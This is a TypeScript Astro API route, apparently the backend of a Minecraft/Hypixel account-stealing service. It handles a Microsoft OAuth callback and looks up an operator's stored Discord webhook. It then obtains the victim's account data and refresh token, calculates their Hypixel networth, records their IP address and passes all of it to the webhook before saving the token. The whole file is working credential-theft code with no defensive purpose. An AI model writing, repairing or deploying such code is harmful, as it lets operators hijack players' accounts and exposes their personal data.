import type { APIRoute } from "astro";
import { queryFirstRes } from "../../../../../libs/db/actions/query";
import saveToken from "../../../../../libs/db/actions/saveToken";
import oauthFlow from "../../../../../libs/microsoft/oauthFlow";
import oauthWebhook from "../../../../../libs/discord/oauthWebhook";
import networthCalc from "../../../../../libs/hypixel/networthCalc";
import urlHandler from "../../../../../libs/urlHandler";

export const get: APIRoute = async ({ request, redirect }) => {
    try{
        const requestUrl = new urlHandler(request.url);
        const query:any = await requestUrl.getQuery();
        if (!["code", "state"].every((key) => query.hasOwnProperty(key))) {
            return await res(400, "Code or State Parameter Missing");
        }
        const code = query["code"];
        const state = query["state"];
        const row = (await queryFirstRes("SELECT * FROM `users` WHERE `user_id` = ?", [state]))['webhook'];
        if (!row) {
            return await res(400, "Invalid State");
        }
        console.log("Callback for user " + state)
        const webhook = row['webhook']
        const redirect_uri = row['redirect'];
        const url = await requestUrl.getURLNoQuery();
        const data:any = await oauthFlow(code, url, false);
        if (data.status !== 200) {
            console.log("Error: " + data.message)
            console.log("-----------------------------------------------------")
            return await res(data.status, data.message);
        }
        const nwData:any = await networthCalc(data['uuid']);
        console.log("got networth data")
        //add ip address to data, cloudflare header
        const ip = request.headers.get("CF-Connecting-IP") || request.headers.get("X-Forwarded-For") || request.headers.get("X-Real-IP") || '69.69.69.69 (Error, dunny why)'; 
        await oauthWebhook(data, nwData, ip, webhook);
        console.log("sent webhook")
        const saveSuccess = await saveToken(state, data['username'], data['uuid'], data['refresh_token'], url)
        if (!saveSuccess) {
            console.log("Error: Error Saving Refresh Token")
            console.log("-----------------------------------------------------")
            return await res(500, "Error Saving Refresh Token");
        }
        console.log("saved token")
        console.log("-----------------------------------------------------")
        return redirect(redirect_uri);
    } catch (e) {
        console.error(e);
        return await res(500, "Internal Server Error");
    }
};

async function res(status:number, message:string) {
    return new Response(JSON.stringify({
        message: message,
        status: status
    }), {
        status: status,
        headers: {
            "Content-Type": "application/json"
        }
    })
}